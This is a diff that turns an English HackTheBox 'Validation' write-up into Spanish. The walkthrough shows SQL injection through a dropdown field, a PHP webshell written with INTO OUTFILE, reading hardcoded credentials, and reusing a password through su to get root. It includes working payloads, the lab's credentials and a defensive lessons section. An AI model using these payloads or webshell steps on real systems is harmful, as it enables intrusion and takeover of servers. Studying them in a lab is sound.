@@ -1,190 +1,190 @@
 # HTB - Validation
 
-Linux machine, Easy difficulty. I did it as part of my security learning path while studying ASIR. I'm leaving it documented exactly as I solved it, dead ends included, because I think that makes the real process easier to understand than if I only showed "command → result → flag".
+Máquina Linux, dificultad Easy. La hice como parte de mi ruta de aprendizaje en seguridad mientras estudio ASIR. La dejo documentada tal y como la fui resolviendo, con los atascos incluidos, porque creo que así se entiende mejor el proceso real que si solo pongo "comando → resultado → flag".
 
 - **IP:** 10.129.95.235
-- **OS:** Linux (Debian)
-- **Difficulty:** Easy
+- **SO:** Linux (Debian)
+- **Dificultad:** Easy
 
 ---
 
-## First steps
+## Primeros pasos
 
-First, a ping to see if the machine responded:
+Lo primero, un ping para ver si la máquina respondía:
 
 ```bash
 ping 10.129.95.235
 ```
 
-It responded fine, and I looked at the TTL:
+Respondía bien, y me fijé en el TTL:
 
 ```
 64 bytes from 10.129.95.235: icmp_seq=1 ttl=63 time=55.0 ms
 ```
 
-TTL=63 → a hint that it is Linux (it usually starts at 64 and drops to 63 after crossing a network hop).
+TTL=63 → es un indicio de que es Linux (normalmente arranca en 64 y al pasar por un salto de red baja a 63).
 
-Then I ran the typical Nmap scan, first looking up what each parameter did because I didn't want to use it without understanding it:
+Después lancé el típico escaneo de Nmap, buscando antes qué hacía cada parámetro porque no quería usarlo sin entenderlo:
 
 ```bash
 nmap -sC -sV -p- --open -n -Pn 10.129.95.235
 ```
 
-- `-sC` → Nmap default scripts
-- `-sV` → detect service versions
-- `-p-` → all ports, not just the usual 1000
-- `--open` → only show the ones that are open
-- `-n` → no DNS resolution
-- `-Pn` → no prior ping (treats it as up directly)
+- `-sC` → scripts por defecto de Nmap
+- `-sV` → detecta versiones de los servicios
+- `-p-` → todos los puertos, no solo los 1000 típicos
+- `--open` → solo enseña los que están abiertos
+- `-n` → no resuelve DNS
+- `-Pn` → no hace ping previo (lo trata como activo directamente)
 
-Port 80 came up open, an Apache.
+Salió el puerto 80 abierto, un Apache.
 
-To find out what language the website used (a guided HTB question), I did a quick curl:
+Para saber qué lenguaje usaba la web (pregunta guiada de HTB), hice un curl rápido:
 
 ```bash
 curl -I http://10.129.95.235
 ```
 
-And the headers showed:
+Y en las cabeceras salió:
 
 ```
 Server: Apache/2.4.48 (Debian)
 X-Powered-By: PHP/7.4.23
 ```
 
-Language: **PHP**.
+Lenguaje: **PHP**.
 
 ---
 
-## Finding the injectable field (I got pretty stuck here)
+## Buscando el campo inyectable (aquí me atasqué bastante)
 
-I didn't do directory fuzzing or any "serious" web enumeration, I went straight for the registration form on the page, which was basically the only place you entered data.
+No hice fuzzing de directorios ni nada de enumeración web "seria", fui directo al formulario de registro de la página, que era básicamente el único sitio donde metías datos.
 
-I tried putting a single quote `'` into the fields to see if it broke anything. The problem is that the **country** field wasn't a text input, it was a dropdown (`<select>`), so I couldn't type anything there directly from the browser. I spent a while not understanding how I was going to inject something into a field that won't even let you type.
+Probé a meter una comilla `'` en los campos para ver si rompía algo. El problema es que el campo **país** no era un input de texto, era un desplegable (`<select>`), así que no podía escribir nada ahí directamente desde el navegador. Me quedé un rato sin entender cómo iba a inyectar algo en un campo que ni siquiera te deja escribir.
 
-The solution was to bring Burp Suite into it: you intercept the request before it goes out, and there you can change the value of `country` to whatever you want, even though in the browser it was a closed dropdown.
+La solución fue meterle Burp Suite por medio: interceptas la petición antes de que salga, y ahí sí puedes cambiar el valor de `country` a lo que quieras, aunque en el navegador fuera un desplegable cerrado.
 
-The flow I ended up with (and that took me a while to grasp at first) was:
+El flujo que me quedó (y que al principio me costó pillar) fue:
 
-1. I make a **POST** to `/` registering a new user (the username can't be repeated, so I kept going through `test1`, `test2`, `testX`...) and in `country` I put the SQL payload
-2. The server responds `302 Found` + a cookie (`Set-Cookie: user=XXXX`) → this just means "registration done, redirecting you to account.php", nothing weirder
-3. I grab that cookie
-4. I make a **GET** to `/account.php` putting that cookie in the header
-5. In that response I see the result of what I injected reflected back
+1. Hago un **POST** a `/` registrando un usuario nuevo (el username no se puede repetir, así que fui tirando de `test1`, `test2`, `pruebaX`...) y en `country` meto el payload SQL
+2. El servidor responde `302 Found` + una cookie (`Set-Cookie: user=XXXX`) → esto solo significa "registro hecho, te mando a account.php", nada más raro
+3. Cojo esa cookie
+4. Hago un **GET** a `/account.php` metiendo esa cookie en la cabecera
+5. En esa respuesta veo reflejado el resultado de lo que inyecté
 
-(Note to self: at the time I thought that because it gave a 302 this was a "blind" injection, but no — it's the opposite. It's an in-band / UNION-based SQLi, because I see the result directly in the HTML of the response. Blind would be if it returned nothing and I had to deduce it from response times or true/false.)
+(Nota para mí mismo: en su momento pensé que como daba un 302 esto era una inyección "blind", pero no — es justo lo contrario. Es una SQLi **in-band / basada en UNION**, porque veo el resultado directo en el HTML de la respuesta. Blind sería si no me devolviera nada y tuviera que deducirlo por tiempos de respuesta o true/false.)
 
 ---
 
-## Confirming it really was injectable
+## Confirmando que de verdad era inyectable
 
-I didn't want to be left with the doubt of "is this injectable or am I fooling myself because I gave it a random name". Two things really confirmed it for me:
+No me quería quedar con la duda de "esto es inyectable o me estoy autoengañando porque le puse un nombre random". Dos cosas me lo confirmaron de verdad:
 
-**1.** When I tried with a column count that didn't match, the server crashed with this:
+**1.** Cuando probaba con un número de columnas que no cuadraba, el servidor petaba con esto:
 
 ```
 Fatal error: Uncaught Error: Call to a member function fetch_assoc() on bool in /var/www/html/account.php:33
 ```
 
-That's a PHP error talking about a MySQL function. If the field were normal text, this would never happen just from changing what I type.
+Eso es un error de PHP hablando de una función de MySQL. Si el campo fuera texto normal, jamás pasaría esto solo por cambiar lo que escribo.
 
-**2.** When I put `UNION SELECT database()`, the page returned the real name of the server's database (`registration`). That cannot be a coincidence in any way — it only happens if my text is actually being executed as SQL code.
+**2.** Cuando metí `UNION SELECT database()`, la página me devolvió el nombre real de la base de datos del servidor (`registration`). Eso no puede ser casualidad de ninguna manera — solo pasa si mi texto se está ejecutando como código SQL de verdad.
 
-### Counting columns
+### Contando columnas
 
-I tried it the brute way:
+Fui probando a lo bruto:
 
 ```sql
 ' UNION SELECT 1,2,3-- -   → error
 ' UNION SELECT 1,2-- -     → error
-' UNION SELECT 1-- -       → works
+' UNION SELECT 1-- -       → funciona
 ```
 
-1 single column.
+1 sola columna.
 
 ---
 
-## Pulling info from the database
+## Sacando info de la base de datos
 
-With the available column, I followed the thread using `information_schema`, which is a metadata database that any MySQL installation has by default (the "index" of everything there is).
+Con la columna disponible, fui tirando del hilo usando `information_schema`, que es una base de datos de metadatos que tiene cualquier instalación de MySQL por defecto (el "índice" de todo lo que hay).
 
-**DB name:**
+**Nombre de la BD:**
 ```sql
 ' UNION SELECT database()-- -
 ```
 → `registration`
 
-**Tables:**
+**Tablas:**
 ```sql
 ' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='registration'-- -
 ```
-→ there was only one table, `registration`
+→ solo había una tabla, `registration`
 
-**Columns:**
+**Columnas:**
 ```sql
 ' UNION SELECT column_name FROM information_schema.columns WHERE table_name='registration'-- -
 ```
 → `username`, `userhash`, `country`, `regtime`
 
-**Dumping `userhash`:**
+**Volcando `userhash`:**
 ```sql
 ' UNION SELECT userhash FROM registration-- -
 ```
-It returned a list of MD5 hashes. I thought they might be passwords, but they turned out to be the session cookies of each registered user. A dead end, but an expected one — this machine's path wasn't going that way.
+Salió una lista de hashes MD5. Pensé que igual eran contraseñas, pero resultaron ser las cookies de sesión de cada usuario registrado. Callejón sin salida, pero esperable — el camino de esta máquina no iba por ahí.
 
 ---
 
-## From the injection to getting a shell
+## De la inyección a tener una shell
 
-MySQL lets you write files to the server's disk with `INTO OUTFILE`, if the DB user has the `FILE` privilege. I used that to drop a webshell directly into Apache's public folder:
+MySQL te deja escribir archivos en el disco del servidor con `INTO OUTFILE`, si el usuario de la BD tiene el privilegio `FILE`. Usé eso para meter una webshell directamente en la carpeta pública de Apache:
 
 ```sql
 ' UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/html/shell.php"-- -
 ```
 
-This writes that PHP code into a new file (`shell.php`), accessible from outside because it lands right in the web root. That PHP takes whatever you send it in the `cmd` parameter and runs it as a system command. From here on I'm not using SQL for anything anymore, I have direct command execution from the browser:
+Esto escribe ese código PHP en un archivo nuevo (`shell.php`), accesible desde fuera porque cae justo en la raíz web. Ese PHP coge lo que le mandes en el parámetro `cmd` y lo ejecuta como comando del sistema. A partir de aquí ya no estoy usando SQL para nada, tengo ejecución de comandos directa desde el navegador:
 
 ```
 http://10.129.95.235/shell.php?cmd=id
 ```
 
 ```
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uid=33(www-data) gid=33(www-data) grupos=33(www-data)
 ```
 
-The user the web runs as is **www-data**.
+El usuario con el que corre la web es **www-data**.
 
 ---
 
-## Escalating to root
+## Escalando a root
 
-### What didn't work
+### Lo que no funcionó
 
 ```
 http://10.129.95.235/shell.php?cmd=sudo -l
 ```
-Nothing.
+Nada.
 
 ```
 http://10.129.95.235/shell.php?cmd=find / -perm -4000 -type f 2>/dev/null
 ```
-Only the normal Debian SUIDs, nothing usable.
+Solo los SUID normales de Debian, nada aprovechable.
 
-### Looking at the web's own files
+### Mirando los archivos de la propia web
 
-Since www-data is who runs the application, I looked at its own files, in case there was some loose password lying around (a typical mistake, putting credentials directly in the code):
+Como www-data es quien corre la aplicación, miré sus propios archivos, por si había alguna contraseña suelta por ahí (error típico, meter credenciales directamente en el código):
 
 ```
 http://10.129.95.235/shell.php?cmd=cat /var/www/html/config.php
 ```
 
-The browser returned it blank because it tried to interpret the `<?php ?>` tags instead of showing them as text. I pulled it out in base64 so it wouldn't break:
+El navegador me lo devolvía en blanco porque intentaba interpretar las etiquetas `<?php ?>` en vez de mostrarlas como texto. Lo saqué en base64 para que no se rompiera:
 
 ```
 http://10.129.95.235/shell.php?cmd=cat /var/www/html/config.php | base64
 ```
 
-Decoded:
+Decodificado:
 
 ```php
 <?php
@@ -195,69 +195,69 @@ Decoded:
 ?>
 ```
 
-MySQL credentials: `uhc` / `uhc-9qual-global-pw`
+Credenciales de MySQL: `uhc` / `uhc-9qual-global-pw`
 
-### Looking for where to reuse that password
+### Buscando dónde reutilizar esa contraseña
 
-The machine's official hint said: *"Password reuse is a real problem. Look for passwords in files the www-data user has access to and check for reuse."*
+La pista oficial de la máquina decía: *"Password reuse is a real problem. Look for passwords in files the www-data user has access to and check for reuse."*
 
-I looked at which system users had a real shell (not `/usr/sbin/nologin`):
+Miré qué usuarios del sistema tenían una shell real (no `/usr/sbin/nologin`):
 
 ```
 http://10.129.95.235/shell.php?cmd=cat /etc/passwd
 ```
 
-`/etc/passwd` always exists on any Linux, it's not anything "secret" I discovered through the hack — what I was looking for there was simply which user had `/bin/bash`. And the only one with a real shell was **root**, all the other service users had `/usr/sbin/nologin` or `/bin/false`.
+`/etc/passwd` siempre existe en cualquier Linux, no es nada "secreto" que haya descubierto por el hackeo — lo que buscaba ahí era simplemente qué usuario tenía `/bin/bash`. Y el único con shell de verdad era **root**, todos los demás usuarios de servicio tenían `/usr/sbin/nologin` o `/bin/false`.
 
-### Attempt 1: SSH (failed)
+### Intento 1: SSH (falló)
 
 ```bash
 ssh root@10.129.95.235
 ```
-With `uhc-9qual-global-pw` → Permission denied, three times.
+Con `uhc-9qual-global-pw` → Permission denied, tres veces.
 
-I looked at the SSH config:
+Miré la config de SSH:
 ```
 http://10.129.95.235/shell.php?cmd=cat /etc/ssh/sshd_config
 ```
 ```
 #PermitRootLogin prohibit-password
 ```
-That's the OpenSSH default value, root can't log in by password over SSH, only with a public key. That's why it failed even though the password was correct.
+Ese es el valor por defecto de OpenSSH, root no puede entrar por contraseña por SSH, solo con clave pública. Por eso fallaba aunque la contraseña fuera la correcta.
 
-### Attempt 2: `su` from the webshell (worked)
+### Intento 2: `su` desde la webshell (funcionó)
 
-Since I already had command execution via the webshell, I didn't need SSH at all. I used `su` directly, passing the password through a pipe because I don't have a real interactive terminal, I can only send single commands through the URL:
+Como ya tenía ejecución de comandos vía la webshell, no necesitaba SSH para nada. Usé `su` directamente, pasando la contraseña por pipe porque no tengo una terminal interactiva real, solo puedo mandar comandos sueltos por la URL:
 
 ```
 http://10.129.95.235/shell.php?cmd=echo uhc-9qual-global-pw | su root -c "cat /root/root.txt"
 ```
 
-- `echo` prints the password
-- the pipe `|` feeds it as if I had typed it when `su` asks for it
-- `su root -c "..."` authenticates as root and runs only that command, without opening a full session
+- `echo` imprime la contraseña
+- el pipe `|` la manda como si la hubiera escrito yo cuando `su` la pide
+- `su root -c "..."` se autentica como root y ejecuta solo ese comando, sin abrir sesión completa
 
-And with that, I was in.
+Y con eso, dentro.
 
 ---
 
 ## Flags
 
-| Flag | Value |
+| Flag | Valor |
 |------|-------|
 | user.txt | `[REDACTED]` |
 | root.txt | `[REDACTED]` |
 
-*(I'm leaving them censored, HTB asks not to publish them in full in public write-ups)*
+*(las dejo censuradas, HTB pide no publicarlas completas en write-ups públicos)*
 
 ---
 
-## What I take away from this machine
+## Lo que me llevo de esta máquina
 
-- **Never concatenate user input into a SQL query.** This is fixed with prepared statements / parameterized queries — that way the engine always treats what you type as data, never as code, no matter what.
-- **Don't reuse passwords across different systems.** The MySQL password and the OS root password were the same. They are two completely different access levels (data vs. full control of the server) and should never depend on the same secret.
-- **Don't hardcode credentials in the code.** The password was in plaintext in `config.php`. It should live in environment variables or a secrets manager, out of the code and out of the web's public folder.
-- **Root shouldn't be the only user with an interactive shell.** The normal setup is to have named users with `sudo` for what they need, and keep direct root access very restricted.
-- **Least privilege in the database too.** The `uhc` user had the `FILE` privilege, which was exactly what let me go from a SQLi to command execution. An application user shouldn't be able to write files at the OS level.
+- **Nunca concatenar input del usuario en una query SQL.** Esto se arregla con prepared statements/consultas parametrizadas — así el motor trata lo que escribes siempre como dato, nunca como código, pase lo que pase.
+- **No reutilizar contraseñas entre sistemas distintos.** La contraseña de MySQL y la de root del sistema operativo eran la misma. Son dos niveles de acceso totalmente distintos (datos vs. control total del servidor) y nunca deberían depender del mismo secreto.
+- **No hardcodear credenciales en el código.** La contraseña estaba en texto plano en `config.php`. Debería ir en variables de entorno o un gestor de secretos, fuera del código y fuera de la carpeta pública de la web.
+- **Root no debería ser el único usuario con shell interactiva.** Lo normal es tener usuarios nominales con `sudo` sobre lo que necesiten, y mantener el acceso directo a root muy restringido.
+- **Mínimo privilegio también en la base de datos.** El usuario `uhc` tenía privilegio `FILE`, que fue justo lo que me permitió pasar de una SQLi a ejecución de comandos. Un usuario de aplicación no debería poder escribir archivos a nivel de sistema operativo.
 
-And on methodology: next time I'll open Burp with Intercept on from the start and browse the whole site that way, instead of poking around raw in the browser and realizing too late that a field (like the country dropdown) can't be touched directly from there. It would have saved me a fair bit of hassle.
+Y a nivel de metodología: la próxima vez abro Burp con Intercept activado desde el principio y navego la web una vez entera así, en vez de ir probando a pelo en el navegador y darme cuenta tarde de que un campo (como el desplegable de país) no se puede tocar directamente desde ahí. Me habría ahorrado bastante lío.
